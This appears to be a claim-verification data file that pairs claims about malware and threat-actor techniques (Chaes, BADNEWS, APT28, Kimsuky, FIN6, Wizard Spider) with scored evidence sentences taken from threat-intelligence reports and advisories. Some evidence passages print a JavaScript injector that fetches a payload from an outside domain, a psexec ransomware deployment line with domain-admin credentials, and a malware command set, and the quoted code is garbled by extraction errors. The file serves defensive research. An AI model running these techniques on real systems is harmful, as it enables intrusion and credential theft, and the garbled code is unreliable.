elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.|0.8651104337526521|['In recent years, the LATAM cybercrime scene has evolved a great deal.', 'Some of the most notorious malware variants that have been prominent in the region over the last year include Grandoreiro, Ursa and Astaroth.', 'LATAM cybercrime activities demonstrate unique features when it comes to TTPs and how malware is propagated on an infected machine.', 'Some of the shared similarities include: Leveraging of .MSI files as an initial way to start the infection chain The use of Delphi as the preferred language to write malware Extensive use of LOLBins to execute content Downloading additional legitimate tools to expand the malwares capabilities and for obfuscation When observing the shared behavior and mindset of LATAM-based threat actors, Cybereason researchers observed that the malware authors emphasize the need to stay under the radar as much as possible, and prefer to use already-existing tools or legitimate software if it fits their needs.', 'FIGURE 1 Full Attack Infographic Chaes: Novel Malware Targeting Latin American E-Commerce 2Key Findings Targeting the Biggest E-Commerce Company in Latin America: Chaes specifically targets the Brazilian website of e-commerce company MercadoLivre and its payment page MercadoPago to steal its customers financial information.', 'The final payload of Chaes is a Node.Js information stealer that exfiltrates data using the node process.', 'Credential Stealing, Screen Capture, Browser Monitoring, Reconnaissance: Chaes is designed to steal sensitive information from the browser such as login credentials, credit card numbers, and other financial information from MercadoLivre website customers.', 'Chaes also takes screenshots of the infected machine, hooks and monitors the Chrome web browser to collect user information from infected hosts.', 'Multistage Delivery, Multi-Language Malware: Chaes delivery consists of several stages that include use of LoLbins and other legitimate software, making it very challenging to detect by traditional AV products.', 'Chaes also has multiple stages and is written in several programming languages including Javascript, Vbscript, .NET , Delphi and Node.js Downloads Legitimate Software, Designed for Stealth: Chaes operates using legitimate tools such as Python, Unrar and Node.js, and Chaes stages consist of several techniques such as use of LoLbins, open source tools, fileless parts and legitimate node.js libraries designed to increase the malwares stealthiness.', 'Under development: Cybereason observed new versions of Chaes, showing that the authors are improving the malware and adding more features FIGURE 1 Cybereason Anti-Malware Solution Detects and Prevents Chaes Chaes: Novel Malware Targeting Latin American E-Commerce 3Threat Analysis Phase One: Initial Access FIGURE 3 First stage of Deployment As with many traditional campaigns, this one begins by sending the victim a phishing email containing a .docx file.']
When it first starts, BADNEWS spawns a new thread to log keystrokes.|0.7820001682391653|"['Most commands are in the format of ""<cmd>:<encryped-parameter>"" where ""<cmd>"" is a plaintext command tag and ""<encrypted-parameter>"" is a parameter for the command encrypted with the algorithm previously described.', 'Listed below are supported command tags and their descriptions: CMD Description shell Download an EXE and inject it into a new process using process hollowing link Download an EXE and execute it via CreateProcess API mod Download a DLL from the URL specified and load it into the current process upd Download a new version of the malware and delete the old one via VBScript (see below) dwd Create an empty file in the %temp% folder and send to C&C - possibly used for identifying the local system time kl Send keylog file to C&C (keylogging is always on) snp Take a screenshot and send it to the C&C ustr Exfiltrate documents found on the machine - the malware asynchronously crawls local hard- drives for documents (pdf, doc etc.)', 'sdwl Upload specified file from victim machine utop Disable document exfiltration hcmd Execute command via cmd.exe and send the output to C&C {{ Use new C&C server address specified between {{ and }} in the content (i.e.', '{{MmVhZGFkMmQ2NGM2YzZjZGNkY2RlNjZmYWUwZjJlZTY0ZmNlOGVjNjZmYWUwZ jJlZTY4ZjJjOGYyMw==}}) ok Do nothing Figure 24 BADNEWS Command Set The malware will send back an acknowledgment response for most of these commands along with any additional data from the command that has been executed.', 'MONSOON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 28/57Forcepoint Security Labs | Special Investigations Keylogger.', 'When BADNEWS first starts it will spawn a new thread to log keystrokes to a file.', 'The header of the file contains the marker ""KLTNM:"" and the system language.', 'The rest of the file contains information about the active window and the keys pressed: KLTNM: 000409 2016/06/01 09:42:18 - {Window Name} [SHIFT]c[SHIFT]; The malware will only send the keylog file to the C&C when instructed to by the ""kl"" command.', 'Document Crawler.', ""When BADNEWS first starts it will spawn a new thread to check all local & mapped drives for document files with the following extensions: doc docx pdf ppt pptx txt Any documents under 15MB will be copied to the user's %temp%\\\SMB\\\ folder."", 'The malware will only send these documents to the C&C when instructed to by the ""ustr"" command.']"
LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets.|0.8908969971669308|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets.|0.8689447558080696|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
They have also dumped the LSASS process memory using the MiniDump function.|0.9478537816446455|['[14]EnterpriseT1027.013Obfuscated Files or Information:Encrypted/Encoded FileAPT28encrypted a .dll payload using RTL and a custom encryption algorithm.APT28has also obfuscated payloads with base64, XOR, and RC4.', '[38][36][11][18][17]EnterpriseT1588.002Obtain Capabilities:ToolAPT28has obtained and used open-source tools likeKoadic,Mimikatz, andResponder.', '[11][22][39]EnterpriseT1137.002Office Application Startup:Office TestAPT28has used the Office Test persistence mechanism within Microsoft Office by adding the Registry keyHKCU\\\Software\\\Microsoft\\\Office test\\\Special\\\Perfto execute code.', '[43]EnterpriseT1003OS Credential DumpingAPT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.', '[44][3][14].001LSASS MemoryAPT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.', '[44][3]They have also dumped the LSASS process memory using the MiniDump function.', '[2].003NTDSAPT28has used the ntdsutil.exe utility to export the Active Directory database for credential access.', '[2]EnterpriseT1120Peripheral Device DiscoveryAPT28uses a module to receive a notification every time a USB mass storage device is inserted into a victim.', '[33]EnterpriseT1566.001Phishing:Spearphishing AttachmentAPT28sent spearphishing emails containing malicious Microsoft Office and RAR attachments.', '[36][10][11][3][22][17][21][16].002Phishing:Spearphishing LinkAPT28sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.', '[3][13][14][16]EnterpriseT1598Phishing for InformationAPT28has used spearphishing to compromise credentials.']
The Launch Agent name may be disguised by using a name from the related operating system or benign software.|0.7733834203478588|"['PowerShell commands/scripts can be executed without invoking powershell.exe through HTA files or mshta.exe.24, 25, 26, 27 Persistence Kimsuky has demonstrated the ability to establish Persistence [TA0003] through using malicious browser extensions, modifying system processes, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file association for an application.', 'By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions.', 'In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser [T1185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative.', 'The reviews were likely left by compromised Google+ accounts.28 19 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries https://cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurrency-industries-40e04829 20 MITRE ATT&CK: Groups Kimsuky https://attack.mitre.org/groups/G0094/ 21 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 22 Palo Alto Networks Unit 42: BabyShark Malware Part Two Attacks Continue Using KimJongRAT and PCRat https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/ 23 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries https://cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurrency-industries-40e04829 24 MITRE ATT&CK: Groups Kimsuky https://attack.mitre.org/groups/G0094/ 25 Palo Alto Networks Unit 42: BabyShark Malware Part Two Attacks Continue Using KimJongRAT and PCRat https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/ 26 McAfee: What is mshta, how can it be used and how to protect against it https://www.mcafee.com/blogs/other-blogs/mcafee-labs/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/ 27 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 28 Netscout: Stolen Pencil Campaign Targets Academia https://www.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia Page 5 of 15 | Product ID: AA20-301A TLP:WHITETLP:W HITE CISA | FBI | CNMF FBI | Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution [T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.29, 30 During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol [T1021.001]).31 Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwp files) in the Registry (Event Triggered Execution: Change Default File Association [T1546.001]).', 'Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor).', 'The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.32 Kimsuky also targets Microsoft Office users by formatting their documents in a .docx file rather than .hwp and will tailor their macros accordingly.33 Kimsuky maintains access to compromised domains by uploading actor-modified versions of open-source Hypertext Processor (PHP)-based web shells; these web shells enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shell [T1505.003]).']"
The Launch Agent name may be disguised by using a name from the related operating system or benign software.|0.7733834203478588|['[24],[25],[26],[27]PersistenceKimsuky has demonstrated the ability to establishPersistence[TA0003] through using malicious browser extensions, modifying system processes, manipulating theautostartexecution, using Remote Desktop Protocol (RDP), and changing the default file association for an application.', 'By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions.In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser[T1185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative.', 'The reviews were likely left by compromised Google+ accounts.', '[28]Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution[T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.', '[29],[30]During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol[T1021.001]).', '[31]Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwpfiles) in the Registry (Event Triggered Execution: Change Default File Association[T1546.001]).']
The daemon name may be disguised by using a name from a related operating system or benign software Masquerading.|0.8396688755810542|"['PowerShell commands/scripts can be executed without invoking powershell.exe through HTA files or mshta.exe.24, 25, 26, 27 Persistence Kimsuky has demonstrated the ability to establish Persistence [TA0003] through using malicious browser extensions, modifying system processes, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file association for an application.', 'By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions.', 'In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser [T1185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative.', 'The reviews were likely left by compromised Google+ accounts.28 19 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries https://cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurrency-industries-40e04829 20 MITRE ATT&CK: Groups Kimsuky https://attack.mitre.org/groups/G0094/ 21 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 22 Palo Alto Networks Unit 42: BabyShark Malware Part Two Attacks Continue Using KimJongRAT and PCRat https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/ 23 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries https://cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurrency-industries-40e04829 24 MITRE ATT&CK: Groups Kimsuky https://attack.mitre.org/groups/G0094/ 25 Palo Alto Networks Unit 42: BabyShark Malware Part Two Attacks Continue Using KimJongRAT and PCRat https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/ 26 McAfee: What is mshta, how can it be used and how to protect against it https://www.mcafee.com/blogs/other-blogs/mcafee-labs/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/ 27 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 28 Netscout: Stolen Pencil Campaign Targets Academia https://www.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia Page 5 of 15 | Product ID: AA20-301A TLP:WHITETLP:W HITE CISA | FBI | CNMF FBI | Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution [T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.29, 30 During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol [T1021.001]).31 Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwp files) in the Registry (Event Triggered Execution: Change Default File Association [T1546.001]).', 'Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor).', 'The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.32 Kimsuky also targets Microsoft Office users by formatting their documents in a .docx file rather than .hwp and will tailor their macros accordingly.33 Kimsuky maintains access to compromised domains by uploading actor-modified versions of open-source Hypertext Processor (PHP)-based web shells; these web shells enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shell [T1505.003]).']"
The daemon name may be disguised by using a name from a related operating system or benign software Masquerading.|0.8396688755810542|['[24],[25],[26],[27]PersistenceKimsuky has demonstrated the ability to establishPersistence[TA0003] through using malicious browser extensions, modifying system processes, manipulating theautostartexecution, using Remote Desktop Protocol (RDP), and changing the default file association for an application.', 'By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions.In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser[T1185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative.', 'The reviews were likely left by compromised Google+ accounts.', '[28]Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution[T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.', '[29],[30]During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol[T1021.001]).', '[31]Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwpfiles) in the Registry (Event Triggered Execution: Change Default File Association[T1546.001]).']
Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.|0.7688718408522451|"['Adversaries may communicate using OSI application layer Application Layer Protocol T1071 protocols to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Web Protocols T1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Mail Protocols T1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using the Domain Name System DNS T1071.004 (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.', 'Page 44 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may stage collected data in a central location or Data Staged T1074 directory prior to Exfiltration.', 'Adversaries may obtain and abuse credentials of existing Valid Accounts T1078 accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.', 'Adversaries may enumerate files and directories or may search in File and Directory T1083 specific locations of a host or network share for certain Discovery information within a file system.', 'To disguise the source of malicious traffic, adversaries may chain Multi-hop Proxy T1090.003 together multiple proxies.', 'Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.']"
Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.|0.7644163308226017|"['To request incident response resources or technical assistance related to these threats, contact CISA atCentral@cisa.gov.', 'For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at (410) 854-4200 orCybersecurity_Requests@nsa.gov.', 'Defense Industrial Base companies may additionally sign up for NSAs free cybersecurity services, including Protective DNS, vulnerability scanning, and threat intelligence collaboration atdib_defense@cyber.nsa.gov.Appendix: Detailed Tactics, Techniques, and ProceduresReconnaissance[TA0043]Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.', 'The adversary is known for harvesting login credentials [T1589.001].', '[17]IDNameDescriptionT1589.001Gather Victim Identity Information: CredentialsAdversaries may gather credentials that can be used during targeting.Initial Access[TA0001]Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network.', 'For example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].', '[18] These specific actors obtained and abused credentials of domain [T1078.002] and cloud accounts [T1078.004].', '[19] The actors also used external remote services to gain access to systems [T1133].', ""[20] The adversary took advantage of weaknesses in internet-facing servers and conducted SQL injection attacks against organizations' external websites [T1190]."", '[21] Finally, they sent spearphishing emails with a malicious link in an attempt to gain access [T1566.002].', '[22]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.T1078.002Valid Accounts: Domain AccountsAdversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.T1078.004Valid Accounts: Cloud AccountsAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.T1133External Remote ServicesAdversaries may leverage external-facing remote services to initially access and/or persist within a network.T1190Exploit Public-Facing ApplicationAdversaries may attempt to take advantage of a weakness in an internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior.T1566.002Phishing: Spearphishing LinkAdversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems.Persistence[TA0003]Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.']"
Ramsay can stage data prior to exfiltration in %APPDATA%\Microsoft\UserSetting and %APPDATA%\Microsoft\UserSetting\MediaCache.|0.8330005060032225|"['Capabilities Ramsays architecture provides a series of capabilities monitored via a logging mechanism intended to assist operators by supplying a feed of actionable intelligence to conduct exfiltration, control, and lateral movement actions, as well as providing overall behavioral and system statistics of each compromised system.', 'The realization of these actions is possible due to the following capabilities: File collection and covert storage The primary goal of this framework is to collect all existing Microsoft Word documents within the targets filesystem.', 'The overall collection stages are shown in Figure 6: https://www.welivesecurity.com/2020/05/13/ramsay-cyberespionage-toolkit-airgapped-networks/ 5/195/14/2020 Ramsay: A cyber-espionage toolkit tailored for air-gapped networks | WeLiveSecurity Figure 6.', 'Mechanism of document collection Word documents will first be collected and stored in a preliminary collection directory.', 'The location of this directory may vary depending on the Ramsay version.', 'Two of the directories we observed being used for this purpose were %APPDATA%\\\Microsoft\\\UserSetting and %APPDATA%\\\Microsoft\\\UserSetting\\\MediaCache.', 'Depending on the Ramsay version, file collection wont be restricted to the local system drive, but also will search additional drives such as network or removable drives: https://www.welivesecurity.com/2020/05/13/ramsay-cyberespionage-toolkit-airgapped-networks/ 6/195/14/2020 Ramsay: A cyber-espionage toolkit tailored for air-gapped networks | WeLiveSecurity Figure 7.', 'Hex-Rays output of procedure to scan removable drives for collection Figure 8.', 'Hex-Rays output of procedure to scan network drives for collection Collected documents are encrypted using the RC4 Stream Cipher Algorithm.', 'The RC4 key used to encrypt each file will be a computed MD5 hash of a randomly generated sequence of 16 bytes, salted with 16 bytes hardcoded in the malware sample.', 'The first 16 bytes of the buffer where the encrypted file will be held will correspond to the actual RC4 key used: https://www.welivesecurity.com/2020/05/13/ramsay-cyberespionage-toolkit-airgapped-networks/ 7/195/14/2020 Ramsay: A cyber-espionage toolkit tailored for air-gapped networks | WeLiveSecurity Figure 9.']"
InvisiMole has attempted to disguise itself by registering under a seemingly legitimate service name.|0.7641412639456923|['ESET Research white papers TLP: WHITE INVISIMOLE: THE HIDDEN PART OF THE STORY UNEARTHING INVISIMOLES ESPIONAGE TOOLSET AND STRATEGIC COOPERATIONS Authors: Zuzana Hromcov Anton CherepanovTLP: WHITE 2 InvisiMole: The hidden part of the story CONTENTS 1 EXECUTIVE SUMMARY  4 2 ATTACKS AND INVESTIGATION  4 2.1 InvisiMoles toolset .', '.', '.', '.', '.', '.', '.']
"FIN6 has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate Windows service."|0.8460665905809576|"['Mandiant identified a utility script named kill.bat that was run on systems in the environment.', 'This script contained a series of anti-forensics and other commands intended to disable antivirus and destabilize the operating system.', 'FIN6 automated the deployment of kill.bat and the LockerGoga ransomware using batch script files.', 'FIN6 created a number of BAT files on the malware distribution servers with the naming convention xaa.bat, xab.bat, xac.bat, etc.', 'These BAT files contained psexec commands to connect to remote systems and deploy kill.bat along with LockerGoga.', 'FIN6 renamed the psexec service name to mstdc in order to masquerade as the legitimate Windows executable msdtc.', 'Example strings from the deployment BAT files are shown in Figure 2.', 'To ensure a high success rate, the attacker used compromised domain administrator credentials.', 'Domain administrators have complete control over Windows systems in an Active Directory environment.start copy svchost.exe \\\10.1.1.1\\\c$\\\windows\\\temp\\\start psexec.exe \\\10.1.1.1 -u domain\\\domainadmin -p ""password"" -d -h -r mstdc -s -accepteula -nobanner c:\\\windows\\\temp\\\svchost.exeFigure 2: Strings from deployment BAT filesRansomwareRyuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer.', 'LockerGoga is ransomware that uses 1024-bit RSA and 128-bit AES encryption to encrypt files and leaves ransom notes in the root directory and shared desktop directory.', 'Additional information about Ryuk and LockerGoga is available on the FireEye Intelligence portal:18-00015730and19-0002005AttributionFIN6 has traditionally conducted intrusions targeting payment card data from Point-of-Sale (POS) or eCommerce systems.']"
It has also used common document file names for other malware binaries.|1.0002|"['[2][4][11][7]EnterpriseT1070.004Indicator Removal:File DeletionWizard Spiderhas used file deletion to remove some modules and configurations from an infected host after use.', '[6]EnterpriseT1105Ingress Tool TransferWizard Spidercan transfer malicious payloads such as ransomware to compromised machines.', '[7]EnterpriseT1490Inhibit System RecoveryWizard Spiderhas used WMIC and vssadmin to manually delete volume shadow copies.Wizard Spiderhas also usedContiransomware to delete volume shadow copies automatically with the use of vssadmin.', '[7]EnterpriseT1570Lateral Tool TransferWizard Spiderhas used stolen credentials to copy tools into the%TEMP%directory of domain controllers.', '[6]EnterpriseT1036.004Masquerading:Masquerade Task or ServiceWizard Spiderhas used scheduled tasks to installTrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf.', '[6]It has also used common document file names for other malware binaries.', '[4]EnterpriseT1112Modify RegistryWizard Spiderhas modified the Registry keyHKLM\\\System\\\CurrentControlSet\\\Control\\\SecurityProviders\\\WDigestby setting theUseLogonCredentialregistry value to1in order to force credentials to be stored in clear text in memory.Wizard Spiderhas also modified the WDigest registry key to allow plaintext credentials to be cached in memory.', '[6][7]EnterpriseT1135Network Share DiscoveryWizard Spiderhas used the ""net view"" command to locate mapped network shares.', '[2]EnterpriseT1027.010Obfuscated Files or Information:Command ObfuscationWizard Spiderused Base64 encoding to obfuscate anEmpireservice and PowerShell commands.', '[5][11]EnterpriseT1588.002Obtain Capabilities:ToolWizard Spiderhas utilized tools such asEmpire,Cobalt Strike,Cobalt Strike,Rubeus,AdFind,BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts.', '[4][7].003Obtain Capabilities:Code Signing CertificatesWizard Spiderhas obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads.']"
Dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.|0.7819735509185834|['The group has also globally opened port 3389.', '[15]EnterpriseT1070.001Indicator Removal:Clear Windows Event LogsDragonflyhas cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.', 'The actors also deleted specific Registry keys.', '[15].004Indicator Removal:File DeletionDragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.', '[15]EnterpriseT1105Ingress Tool TransferDragonflyhas copied and installed tools for operations once in the victim environment.', '[15]EnterpriseT1036MasqueradingDragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.', '[15]EnterpriseT1112Modify RegistryDragonflyhas modified the Registry to perform multiple techniques through the use ofReg.', '[15]EnterpriseT1135Network Share DiscoveryDragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.', '[15]EnterpriseT1588.002Obtain Capabilities:ToolDragonflyhas obtained and used tools such asMimikatz,CrackMapExec, andPsExec.', '[4]EnterpriseT1003.002OS Credential Dumping:Security Account ManagerDragonflyhas dropped and executed SecretsDump to dump password hashes.', '[15].003OS Credential Dumping:NTDSDragonflyhas dropped and executed SecretsDump to dump password hashes.']
OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\; the malicious file by the same name is saved in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\.|0.8863244354775903|[]
OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\; the malicious file by the same name is saved in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\.|0.8863244354775903|[]
BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.|0.7974306039508465|['Figure 13.', 'Scheduled task registration.', '(Source: Secureworks) Figure 14 shows the batch file (zrun.bat) executing, which adds a registry entry that auto-executes the malware.', 'Figure 14.', 'Registry entry added to auto-execute malware.', '(Source: Secureworks) CTU researchers have also observed BRONZE BUTLER giving malware the same name as an existing document file on the file share server to cause users to unwittingly launch and install the malware on additional systems (see Figure 15).', 'Figure 15.', 'Malware given the same name as an existing document file.', '(Source: PDF generated automatically by the PDFmyURL HTML to PDF APISecureworks) Exfiltration BRONZE BUTLER typically creates a list of files (i.e., a shopping list) from compromised hosts and file-share servers.', 'If the list is short, the group exfiltrates the files directly.', 'For large lists, the threat actors use the following procedure: 1.']
